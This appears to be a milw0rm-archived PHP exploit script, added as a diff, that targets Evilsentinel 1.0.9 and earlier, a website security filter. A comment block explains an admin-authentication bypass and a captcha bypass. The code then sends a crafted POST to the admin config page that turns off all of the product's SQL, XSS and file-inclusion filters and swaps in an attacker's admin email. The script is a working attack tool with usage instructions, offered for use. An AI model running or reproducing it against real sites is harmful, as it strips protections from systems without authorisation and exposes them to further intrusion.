@@ -1,0 +1,148 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo '
+Evilsentinel <= 1.0.9 Disable Exploit
+by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
+Thanks to rgod for the php code and Marty for the Love
+
+';
+if ($argc<3) {
+echo "Usage: php ".$argv[0]." Host Path [new_mail]
+Host:          target server (ip/hostname)
+Path:          path of Evilsentinel
+new_mail:      optional, specify a new admin mail
+
+Example:
+php ".$argv[0]." localhost / ";
+
+die;
+}
+
+/*
+Vendor site: http://evilsentinel.altervista.org
+
+Explanation:
+
+I've done a quick research on this platform.. just pen-tested it, not tested..
+I have found some problems that affect this script:
+
+1 - Admin bypass:
+
+admin/index.php, line 13:
+
+if( !es_islogged() ){
+        header( "Location: login.php" );
+}
+
+really need an explanation? 0_o
+
+2 - captcha bypass
+
+admin/config.php, line 40:
+
+if( $_POST['es_security_captcha'] == $_SESSION["es_security_captcha"] )
+
+simply do not call the file captcha.php, and do not set a post variable named 'es_security_captcha' to bypass
+
+3 - spamming/anon mailing (not tested)
+
+while into the ACP you can set a new mail for the admin.. putting the mail you want and attacking the site
+with special forged HTTP_USER_AGENT headers you can send a mail with (also) the text you want
+
+BlackHawk <hawkgotyou@gmail.com>
+*/
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+        $c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+        }
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+if (isset($argv[3]))
+{
+$mail=$argv[3];
+}
+else
+{
+$mail = 'someone@somwhat.somewhere';
+}
+$port=80;
+$proxy="";
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+
+echo "Deactivating the system..\r\n";
+$data="get_filter=0&post_filter=0&cookie_filter=0&xss_filter=0&rfi_filter=0&lfi_filter=0&sql_filter=0&email_notify=1&notify_email=$mail&referer_filter=0&referer_trigger=&ex_list=&ip_tracking=0&confirm=obviously";
+$packet="POST ".$p."admin/index.php?action=config HTTP/1.0\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: $host\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n\r\n";
+$packet.=$data;
+
+sendpacketii($packet);
+
+
+echo "Evilsentinel is off\r\n";
+?>
+
+# milw0rm.com [2008-01-10]
